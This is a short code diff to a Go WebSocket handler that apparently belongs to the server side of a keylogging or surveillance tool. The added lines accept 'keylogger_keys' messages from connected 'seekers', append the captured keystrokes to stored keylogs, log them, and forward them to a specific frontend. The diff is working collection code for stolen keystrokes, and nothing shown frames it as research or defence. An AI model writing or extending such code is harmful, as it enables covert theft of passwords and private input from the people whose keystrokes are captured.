@@ -86,11 +86,20 @@ func SeekerWebSocketHandler(w http.ResponseWriter, r *http.Request) {
 		seekersLock.Lock()
 		if seeker, exists := seekers[initData.ID]; exists {
 			seeker.LastActive = time.Now()
+
+			if msg.Type == "keylogger_keys" {
+				if keyData, ok := msg.Data.(string); ok {
+					seeker.Keylogs += keyData
+					log.Printf("Keylogs updated for seeker %s: %s", initData.ID, keyData)
+				} else {
+					log.Printf("Invalid keylogger data format for seeker %s", initData.ID)
+				}
+			}
 		}
 		seekersLock.Unlock()
 
 		log.Printf("Received from seeker %s: %v", initData.ID, msg)
 
-		broadcastToFrontends(msg)
+		sendToFrontend(initData.ID, msg)
 	}
 }
